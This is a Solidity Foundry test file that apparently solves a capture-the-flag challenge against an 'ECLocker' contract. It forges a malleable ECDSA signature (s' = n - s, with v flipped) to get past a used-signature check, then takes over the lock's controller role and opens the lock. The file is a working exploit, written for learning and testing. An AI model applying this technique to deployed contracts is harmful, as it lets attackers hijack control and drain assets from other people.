// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {Impersonator, ECLocker} from "../Impersonator.sol";

// signature is exposed after the emit of event, attacker have seen it 
// emit NewLock(address(newLock), lockCounter, block.timestamp,       signature       );

contract ECLockerExploitTest is Test {
    // secp256k1 curve order (n) - constant never changes every where
    uint256 constant SECP256K1_N =
        0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    Impersonator impersonator;
    ECLocker locker;

    uint256 ownerPk = 0xA11CE;
    uint256 controllerPk = 0xB0B;   // legitimate initial controller
    uint256 attackerPk = 0xBEEF;    // attacker's own key, used to prove full takeover

    address owner = vm.addr(ownerPk);
    address controller = vm.addr(controllerPk);
    address attacker = vm.addr(attackerPk);

    function setUp() public {
        vm.prank(owner);
        impersonator = new Impersonator(0);

        // --- Legit deployment flow ---
        // deployNewLock does ++lockCounter first, so this lock's id is 1.
        uint256 lockId = 1;

        // Reproduce the contract's exact msgHash construction:
        // keccak256("\x19Ethereum Signed Message:\n32" || lockId)
        bytes32 msgHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", lockId)
        );

        // Controller signs the lockId (personal_sign style)
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(controllerPk, msgHash);

        // _signature layout expected by the constructor: abi.encode(r, s, v)
        bytes memory signature = abi.encode(r, s, v);

        vm.prank(owner);
        impersonator.deployNewLock(signature);

        locker = impersonator.lockers(0);

        // Sanity check: controller was set correctly
        assertEq(locker.controller(), controller, "setup: controller mismatch");
    }

    function test_Challenge32_Passed() public {
        uint256 lockId = 1;
        bytes32 msgHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", lockId)
        );

        // Recreate the *original* signature the same way the constructor did.
        // This exact (v,r,s) is already marked "used" inside the constructor,
        // so replaying it verbatim would revert with SignatureAlreadyUsed.
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(controllerPk, msgHash);
        // --- Forge the malleable twin ---
        // s' = n - s, v' = flip(v). ecrecover(msgHash, v', r, s') recovers
        // the SAME address, but produces a different signatureHash, so it
        // bypasses the usedSignatures check.
        uint256 sMalleable = SECP256K1_N - uint256(s);
        uint8 vMalleable = v == 27 ? 28 : 27;

        // Confirm off-chain that both signatures recover to the same signer
        address recoveredOriginal = ecrecover(msgHash, v, r, s);
        address recoveredMalleable = ecrecover(msgHash, vMalleable, r, bytes32(sMalleable));
        assertEq(recoveredOriginal, controller);
        assertEq(recoveredMalleable, controller);

        // --- Attacker takes over ---
        // Anyone can call this; there is no msg.sender check anywhere.
        vm.prank(attacker);
        locker.changeController(vMalleable, r, bytes32(sMalleable), attacker);
        assertEq(locker.controller(), attacker, "takeover failed");

        // --- Prove full control: attacker can now open the lock at will ---
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(attackerPk, msgHash);
        vm.prank(attacker);
        locker.open(v2, r2, s2);
    }
}